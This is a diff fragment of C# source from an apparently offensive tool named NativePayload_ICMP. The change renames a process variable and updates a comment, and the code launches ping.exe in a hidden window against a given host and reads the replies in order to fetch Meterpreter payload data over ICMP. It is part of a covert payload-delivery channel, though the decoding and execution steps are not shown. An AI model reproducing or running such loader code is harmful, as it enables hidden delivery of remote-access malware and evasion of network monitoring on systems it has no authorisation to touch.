@@ -376,20 +376,20 @@ namespace NativePayload_ICMP
                 //// so in code i changed this to 1 ;) , Sorry 
                 if (counter != 1) { counter = 1; }
 
-                /// Make DNS traffic for getting Meterpreter Payloads by nslookup
+                /// Make ICMPv4 traffic for getting Meterpreter Payloads by Ping
                 ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("ping.exe", IPAddress_DNSName + " -n " + counter.ToString());                
                 ns_Prcs_info.RedirectStandardInput = true;
                 ns_Prcs_info.RedirectStandardOutput = true;
                 ns_Prcs_info.UseShellExecute = false;
                 
 
-                Process nslookup = new Process();
-                nslookup.StartInfo = ns_Prcs_info;
-                nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                nslookup.Start();
+                Process myPing = new Process();
+                myPing.StartInfo = ns_Prcs_info;
+                myPing.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                myPing.Start();
 
                 //string result_Line0 = "";
-                string Pingoutput = nslookup.StandardOutput.ReadToEnd();
+                string Pingoutput = myPing.StandardOutput.ReadToEnd();
                 string[] All_lines = Pingoutput.Split('\t', '\n');
                 
                 //int PayloadLines_current_id = 0;
